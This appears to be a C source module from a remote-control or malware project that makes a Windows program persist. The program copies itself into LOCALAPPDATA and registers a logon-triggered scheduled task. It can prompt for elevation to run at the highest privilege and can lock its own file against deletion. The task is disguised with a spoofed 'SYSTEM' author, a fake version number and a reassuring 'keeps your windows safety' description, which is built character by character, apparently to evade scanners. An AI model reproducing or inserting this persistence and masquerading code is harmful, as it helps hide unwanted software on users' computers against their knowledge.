/*
* Author: 962914132@qq.com
* Purpose: Create a scheduled task.
* Language: C
*/

#include "reg_startup.h"
#include <windows.h>
#include <taskschd.h>
#include <wchar.h>
#include <userenv.h>
#include <lmcons.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stddef.h>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "shlwapi.lib")

static StartupLogFunc Log = NULL;

#define Mprintf(format, ...) if (Log) Log(__FILE__, __LINE__, format, __VA_ARGS__)

inline void ConvertCharToWChar(const char* charStr, wchar_t* wcharStr, size_t wcharSize)
{
    MultiByteToWideChar(CP_ACP, 0, charStr, -1, wcharStr, wcharSize);
}

int CreateScheduledTask(const char* taskName,const char* exePath,BOOL check,const char* desc,BOOL run, BOOL runasAdmin)
{
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        Mprintf("无法初始化COM库，错误代码：%ld\n", hr);
        return 1;
    }

    ITaskService* pService = NULL;
    hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) {
        Mprintf("无法创建TaskScheduler实例，错误代码：%ld\n", hr);
        CoUninitialize();
        return 2;
    }

    VARIANT empty;
    VariantInit(&empty);
    empty.vt = VT_EMPTY;
    hr = pService->lpVtbl->Connect(pService, empty, empty, empty, empty);
    if (FAILED(hr)) {
        Mprintf("无法连接到任务计划服务，错误代码：%ld\n", hr);
        pService->lpVtbl->Release(pService);
        CoUninitialize();
        return 3;
    }

    WCHAR wRootPath[MAX_PATH] = {0};
    ConvertCharToWChar("\\", wRootPath, MAX_PATH);

    ITaskFolder* pRootFolder = NULL;
    hr = pService->lpVtbl->GetFolder(pService, wRootPath, &pRootFolder);
    if (FAILED(hr)) {
        Mprintf("无法获取任务计划程序根文件夹，错误代码：%ld\n", hr);
        pService->lpVtbl->Release(pService);
        CoUninitialize();
        return 4;
    }

    WCHAR wTaskName[MAX_PATH] = {0};
    ConvertCharToWChar(taskName, wTaskName, MAX_PATH);

    IRegisteredTask* pOldTask = NULL;
    hr = pRootFolder->lpVtbl->GetTask(pRootFolder, wTaskName, &pOldTask);
    if (SUCCEEDED(hr) && pOldTask != NULL) {
        Mprintf("任务已存在: %s\n", taskName);
        pOldTask->lpVtbl->Release(pOldTask);
        if (check) {
            pRootFolder->lpVtbl->Release(pRootFolder);
            pService->lpVtbl->Release(pService);
            CoUninitialize();
            return 0;
        }
    }

    pRootFolder->lpVtbl->DeleteTask(pRootFolder, wTaskName, 0);

    ITaskDefinition* pTask = NULL;
    hr = pService->lpVtbl->NewTask(pService, 0, &pTask);
    pRootFolder->lpVtbl->Release(pRootFolder);
    if (FAILED(hr)) {
        Mprintf("无法创建任务定义，错误代码：%ld\n", hr);
        pService->lpVtbl->Release(pService);
        CoUninitialize();
        return 5;
    }

    // 配置设置
    ITaskSettings* pSettings = NULL;
    hr = pTask->lpVtbl->get_Settings(pTask, &pSettings);
    if (SUCCEEDED(hr)) {
        BSTR zeroTime = SysAllocString(L"PT0S");
        pSettings->lpVtbl->put_ExecutionTimeLimit(pSettings, zeroTime);
        SysFreeString(zeroTime);
        pSettings->lpVtbl->put_DisallowStartIfOnBatteries(pSettings, VARIANT_FALSE);
        pSettings->lpVtbl->put_StopIfGoingOnBatteries(pSettings, VARIANT_FALSE);
        pSettings->lpVtbl->Release(pSettings);
    }
    else {
        Mprintf("获取配置设置失败，错误代码：%ld\n", hr);
    }

    IRegistrationInfo* pRegInfo = NULL;
    hr = pTask->lpVtbl->get_RegistrationInfo(pTask, &pRegInfo);
    if (SUCCEEDED(hr)) {
        WCHAR temp[MAX_PATH] = {0};
        ConvertCharToWChar("SYSTEM", temp, MAX_PATH);
        BSTR author = SysAllocString(temp);
        pRegInfo->lpVtbl->put_Author(pRegInfo, author);
        SysFreeString(author);
        ConvertCharToWChar("v12.0.0.1", temp, MAX_PATH);
        BSTR version = SysAllocString(temp);
        pRegInfo->lpVtbl->put_Version(pRegInfo, version);
        SysFreeString(version);
        char d[] = {'T','h','i','s',' ','s','e','r','v','i','c','e',' ','k','e','e','p','s',' ',
                    'y','o','u','r',' ','w','i','n','d','o','w','s',' ','s','a','f','e','t','y','.',0
                   };
        ConvertCharToWChar(desc ? desc : d, temp, MAX_PATH);
        BSTR bDesc = SysAllocString(temp);
        pRegInfo->lpVtbl->put_Description(pRegInfo, bDesc);
        SysFreeString(bDesc);
        pRegInfo->lpVtbl->Release(pRegInfo);
    }
    else {
        Mprintf("获取注册信息失败，错误代码：%ld\n", hr);
    }

    ITriggerCollection* pTriggerCollection = NULL;
    hr = pTask->lpVtbl->get_Triggers(pTask, &pTriggerCollection);
    if (SUCCEEDED(hr)) {
        ITrigger* pTrigger = NULL;
        hr = pTriggerCollection->lpVtbl->Create(pTriggerCollection, TASK_TRIGGER_LOGON, &pTrigger);
        pTriggerCollection->lpVtbl->Release(pTriggerCollection);
        if (SUCCEEDED(hr)) {
            // 普通用户需要指定具体用户
            if (!runasAdmin) {
                ILogonTrigger* pLogonTrigger = NULL;
                hr = pTrigger->lpVtbl->QueryInterface(pTrigger, &IID_ILogonTrigger, (void**)&pLogonTrigger);
                if (SUCCEEDED(hr)) {
                    char userName[UNLEN + 1] = { 0 };
                    DWORD nameLen = UNLEN + 1;
                    GetUserNameA(userName, &nameLen);
                    WCHAR wUser[MAX_PATH] = { 0 };
                    ConvertCharToWChar(userName, wUser, MAX_PATH);
                    BSTR bstrUser = SysAllocString(wUser);
                    pLogonTrigger->lpVtbl->put_UserId(pLogonTrigger, bstrUser);
                    SysFreeString(bstrUser);
                    pLogonTrigger->lpVtbl->Release(pLogonTrigger);
                }
            }
            pTrigger->lpVtbl->Release(pTrigger);
        }
        else {
            Mprintf("无法设置任务触发器，错误代码：%ld\n", hr);
            pTask->lpVtbl->Release(pTask);
            pService->lpVtbl->Release(pService);
            CoUninitialize();
            return 6;
        }
    }
    else {
        Mprintf("获取任务触发失败，错误代码：%ld\n", hr);
    }

    // 设置操作
    IActionCollection* pActionCollection = NULL;
    hr = pTask->lpVtbl->get_Actions(pTask, &pActionCollection);
    if (SUCCEEDED(hr)) {
        IAction* pAction = NULL;
        hr = pActionCollection->lpVtbl->Create(pActionCollection, TASK_ACTION_EXEC, &pAction);
        if (SUCCEEDED(hr)) {
            IExecAction* pExecAction = NULL;
            hr = pAction->lpVtbl->QueryInterface(pAction, &IID_IExecAction, (void**)&pExecAction);
            if (SUCCEEDED(hr)) {
                WCHAR wExePath[MAX_PATH] = {0};
                ConvertCharToWChar(exePath, wExePath, MAX_PATH);
                BSTR path = SysAllocString(wExePath);
                pExecAction->lpVtbl->put_Path(pExecAction, path);
                SysFreeString(path);
                pExecAction->lpVtbl->Release(pExecAction);
            }
            else {
                Mprintf("QueryInterface 调用失败，错误代码：%ld\n", hr);
            }
            pAction->lpVtbl->Release(pAction);
        }
        else {
            Mprintf("创建任务动作失败，错误代码：%ld\n", hr);
        }
        pActionCollection->lpVtbl->Release(pActionCollection);
    }
    else {
        Mprintf("获取任务动作失败，错误代码：%ld\n", hr);
    }

    // 权限配置
    IPrincipal* pPrincipal = NULL;
    if (runasAdmin && SUCCEEDED(pTask->lpVtbl->get_Principal(pTask, &pPrincipal))) {
        hr = pPrincipal->lpVtbl->put_LogonType(pPrincipal, TASK_LOGON_INTERACTIVE_TOKEN);
        if (FAILED(hr)) Mprintf("put_LogonType 失败，错误代码：%ld\n", hr);
        hr = pPrincipal->lpVtbl->put_RunLevel(pPrincipal, runasAdmin ? TASK_RUNLEVEL_HIGHEST : TASK_RUNLEVEL_LUA);
        if (FAILED(hr)) Mprintf("put_RunLevel 失败，错误代码：%ld\n", hr);
        pPrincipal->lpVtbl->Release(pPrincipal);
    }
    else {
        if (runasAdmin) Mprintf("获取任务权限失败，错误代码：%ld\n", hr);
    }

    // 注册任务
    ITaskFolder* pFolder = NULL;
    hr = pService->lpVtbl->GetFolder(pService, wRootPath, &pFolder);
    ConvertCharToWChar(taskName, wTaskName, MAX_PATH);

    if (SUCCEEDED(hr)) {
        char userName[UNLEN + 1] = {0};
        DWORD nameLen = UNLEN + 1;
        if (GetUserNameA(userName, &nameLen)) {
            Mprintf("创建任务计划. 当前用户名称为: %s\n", userName);
        }
        WCHAR wUser[_MAX_PATH] = {0};
        ConvertCharToWChar(userName, wUser, MAX_PATH);
        BSTR bstrTaskName = SysAllocString(wTaskName);
        VARIANT vUser;
        VariantInit(&vUser);
        vUser.vt = VT_BSTR;
        vUser.bstrVal = SysAllocString(wUser);

        IRegisteredTask* pRegisteredTask = NULL;
        hr = pFolder->lpVtbl->RegisterTaskDefinition(
                 pFolder,
                 bstrTaskName,
                 pTask,
                 TASK_CREATE_OR_UPDATE,
                 runasAdmin ? vUser : empty,
                 empty,
                 TASK_LOGON_INTERACTIVE_TOKEN,
                 empty,
                 &pRegisteredTask
             );

        if (SUCCEEDED(hr)) {
            if (run) {
                IRunningTask* pRunningTask = NULL;
                hr = pRegisteredTask->lpVtbl->Run(pRegisteredTask, empty, &pRunningTask);
                if (SUCCEEDED(hr)) {
                    pRunningTask->lpVtbl->Release(pRunningTask);
                } else {
                    Mprintf("无法启动任务，错误代码：%ld\n", hr);
                }
            }
            pRegisteredTask->lpVtbl->Release(pRegisteredTask);
        }
        else {
            Mprintf("注册计划任务失败，错误代码：%ld | runasAdmin: %s\n", hr, runasAdmin ? "Yes" : "No");
        }

        VariantClear(&vUser);
        SysFreeString(bstrTaskName);
        pFolder->lpVtbl->Release(pFolder);
    }
    else {
        Mprintf("获取任务目录失败，错误代码：%ld\n", hr);
    }

    pTask->lpVtbl->Release(pTask);
    pService->lpVtbl->Release(pService);
    CoUninitialize();

    return SUCCEEDED(hr) ? 0 : 7;
}

BOOL IsRunningAsAdmin()
{
    BOOL isAdmin = FALSE;
    PSID administratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
                                 0, 0, 0, 0, 0, 0, &administratorsGroup)) {
        if (!CheckTokenMembership(NULL, administratorsGroup, &isAdmin)) {
            isAdmin = FALSE;
        }

        FreeSid(administratorsGroup);
    }

    return isAdmin;
}

BOOL LaunchAsAdmin(const char* szFilePath, const char* verb)
{
    SHELLEXECUTEINFOA shExecInfo;
    ZeroMemory(&shExecInfo, sizeof(SHELLEXECUTEINFOA));
    shExecInfo.cbSize = sizeof(SHELLEXECUTEINFOA);
    shExecInfo.fMask = SEE_MASK_DEFAULT;
    shExecInfo.hwnd = NULL;
    shExecInfo.lpVerb = verb;
    shExecInfo.lpFile = szFilePath;
    shExecInfo.nShow = SW_NORMAL;

    return ShellExecuteExA(&shExecInfo);
}

BOOL CreateDirectoryRecursively(const char* path)
{
    if (PathFileExistsA(path))
        return TRUE;

    char temp[MAX_PATH] = { 0 };
    size_t len = strlen(path);
    strncpy(temp, path, len);

    for (size_t i = 0; i < len; ++i) {
        if (temp[i] == '\\') {
            temp[i] = '\0';
            if (!PathFileExistsA(temp)) {
                if (!CreateDirectoryA(temp, NULL))
                    return FALSE;
            }
            temp[i] = '\\';
        }
    }

    if (!CreateDirectoryA(temp, NULL))
        return FALSE;

    return TRUE;
}

int RegisterStartup(const char* startupName, const char* exeName, bool lockFile, bool runasAdmin, StartupLogFunc log)
{
#ifdef _DEBUG
    return 1;
#endif
    Log = log;
    char folder[MAX_PATH] = { 0 };
    if (GetEnvironmentVariableA("LOCALAPPDATA", folder, MAX_PATH) > 0) {
        size_t len = strlen(folder);
        if (len > 0 && folder[len - 1] != '\\') {
            folder[len] = '\\';
            folder[len + 1] = '\0';
        }
        strcat(folder, startupName);

        if (!CreateDirectoryRecursively(folder)) {
            Mprintf("Failed to create directory structure: %s\n", folder);
            return -1;
        }
    }

    char curFile[MAX_PATH] = { 0 };
    GetModuleFileNameA(NULL, curFile, MAX_PATH);

    char dstFile[MAX_PATH] = { 0 };
    sprintf(dstFile, "%s\\%s.exe", folder, exeName);
    BOOL isAdmin = IsRunningAsAdmin();
    if (isAdmin) runasAdmin = true;
    if (_stricmp(curFile, dstFile) != 0) {
        if (!isAdmin) {
            if (runasAdmin) {
                if (!LaunchAsAdmin(curFile, "runas")) {
                    Mprintf("The program will now exit. Please restart it with administrator privileges.");
                    return -1;
                }
                Mprintf("Choosing with administrator privileges: %s.\n", curFile);
                return 0;
            }
        } else {
            Mprintf("Running with administrator privileges: %s.\n", curFile);
        }

        DeleteFileA(dstFile);
        BOOL b = CopyFileA(curFile, dstFile, FALSE);
        Mprintf("Copy '%s' -> '%s': %s [Code: %d].\n",
                curFile, dstFile, b ? "succeed" : "failed", GetLastError());

        int status = CreateScheduledTask(startupName, dstFile, FALSE, NULL, TRUE, runasAdmin);
        Mprintf("任务计划创建: %s!\n", status == 0 ? "成功" : "失败");

        return 0;
    }
    int status = CreateScheduledTask(startupName, dstFile, TRUE, NULL, FALSE, runasAdmin);
    Mprintf("任务计划创建: %s!\n", status == 0 ? "成功" : "失败");
    if (lockFile)
        CreateFileA(curFile, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    return 1;
}
